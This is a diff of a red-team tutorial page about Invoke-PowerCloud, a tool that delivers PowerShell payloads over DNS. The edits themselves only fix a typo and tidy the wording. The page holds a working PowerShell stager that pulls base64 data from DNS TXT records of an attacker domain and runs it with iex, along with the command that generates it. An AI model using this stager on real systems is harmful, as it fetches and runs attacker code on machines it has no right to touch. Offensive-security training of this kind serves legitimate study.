@@ -93,12 +93,11 @@ We are now good to go - issue the below on your attacking system:
 PS C:\tools\powercloud> . .\powercloud.ps1; Invoke-PowerCloud -FilePath .\payload.txt -Domain redteam.me -Verbose
 ```
 
-The script will generate two stagers that looks like the one below - it's the code that can be executed on the target system:
+The script will generate two stagers. One of them is shown here:
 
 {% code-tabs %}
 {% code-tabs-item title="attacker@victim" %}
 ```csharp
-# stager to be launched on the victim system
 $b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.redteam.me")[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
 ```
 {% endcode-tabs-item %}
@@ -106,7 +105,7 @@ $b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.redteam.me")[-1] }
 
 ![](../.gitbook/assets/screenshot-from-2018-10-15-22-47-26.png)
 
-Let's execite the stager on the victim system to get the payload delivered via DNS:
+Let's execute the stager on the victim system to get the payload delivered via DNS:
 
 ![](../.gitbook/assets/screenshot-from-2018-10-15-22-47-12.png)
 
@@ -129,6 +128,4 @@ You can download or contribute to Invoke-PowerCloud here:
 {% embed url="https://github.com/mdsecactivebreach/PowerDNS" %}
 
 {% embed url="https://www.mdsec.co.uk/2017/07/powershell-dns-delivery-with-powerdns/" %}
-
-
 
